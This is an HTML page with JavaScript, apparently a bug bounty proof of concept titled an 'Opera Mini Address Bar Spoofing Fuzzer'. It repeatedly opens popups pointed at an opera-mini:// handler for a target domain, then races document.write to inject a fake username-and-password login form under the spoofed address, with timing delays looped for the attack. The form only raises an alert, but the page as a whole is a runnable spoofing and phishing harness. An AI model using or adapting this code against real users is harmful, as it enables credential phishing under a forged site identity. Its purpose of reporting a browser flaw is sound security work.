<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Opera Mini Bug Bounty - Navigation Timing Fuzzer</title>
<style>
body { font-family: sans-serif; padding: 20px; line-height: 1.5; background: #fafafa; color: #333; }
.log-box { background: #222; color: #00ff00; padding: 15px; border-radius: 5px; font-family: monospace; height: 200px; overflow-y: scroll; margin-top: 15px; }
button { background: #4285F4; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold; }
button:hover { background: #357ae8; }
.config { margin-bottom: 20px; background: #fff; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
input { width: 100%; padding: 10px; margin: 8px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
</style>
</head>
<body>

<h2>Opera Mini Address Bar Spoofing Fuzzer</h2>
<p>This automated script tests navigation timing race conditions against the internal protocol handler to identify address bar synchronization issues.</p>

<div class="config">
    <label>Target Domain Identity:</label>
    <input type="text" id="targetDomain" value="https://google.com">
</div>

<button onclick="startAutomatedFuzzing()">Launch Automated Fuzzing</button>

<h3>Execution Activity Log:</h3>
<div id="log" class="log-box">Awaiting execution...</div>

<script>
    function logMessage(msg) {
        const logBox = document.getElementById('log');
        logBox.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
        logBox.scrollTop = logBox.scrollHeight;
    }

    function generateEvilPayload(target) {
        return `opera-mini://open?url=${encodeURIComponent(target)}`;
    }

    async function startAutomatedFuzzing() {
        const target = document.getElementById('targetDomain').value;
        logMessage("Starting microsecond navigation timing cycle...");

        for (let delay = 0; delay <= 50; delay += 2) {
            logMessage(`Testing execution state with interval delay: ${delay}ms`);

            let testWin = window.open("about:blank", "_blank");
            if (!testWin) {
                logMessage("Error: Pop-up blocker active. Please allow pop-ups for this origin.");
                break;
            }

            const payloadUrl = generateEvilPayload(target);
            testWin.location.href = payloadUrl;

            await new Promise(resolve => setTimeout(resolve, delay));

            try {
                testWin.document.open();
                testWin.document.write(`
                    <html>
                    <head>
                        <meta charset="UTF-8">
                        <title>PoC Navigation Audit</title>
                        <style>
                            body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f0f0f0; }
                            .login-box { background: #fff; padding: 20px; border: 1px solid #ccc; display: inline-block; border-radius: 5px; width: 300px; }
                            input { display: block; margin: 10px auto; padding: 10px; width: 100%; border: 1px solid #ccc; border-radius: 4px; }
                            button { padding: 10px 20px; cursor: pointer; background: #4285F4; color: white; border: none; width: 100%; font-weight: bold; }
                        </style>
                    </head>
                    <body>
                        <h2>PoC by FARISSAL B</h2>
                        <div class="login-box">
                            <input type="text" placeholder="Username or email">
                            <input type="password" placeholder="Password">
                            <button onclick="alert('Data submitted to: ' + document.domain)">Log in</button>
                        </div>
                        <p>UI State Machine Synchronization Test Case (${delay}ms)</p>
                    </body>
                    </html>
                `);
                testWin.document.close();
                testWin.stop();
            } catch (err) {
                console.log("State protected by SOP execution boundary.");
            }

            await new Promise(resolve => setTimeout(resolve, 4000));
            try { testWin.close(); } catch(e) {}
        }
        logMessage("Automated fuzzing lifecycle completed.");
    }
</script>
</body>
</html>
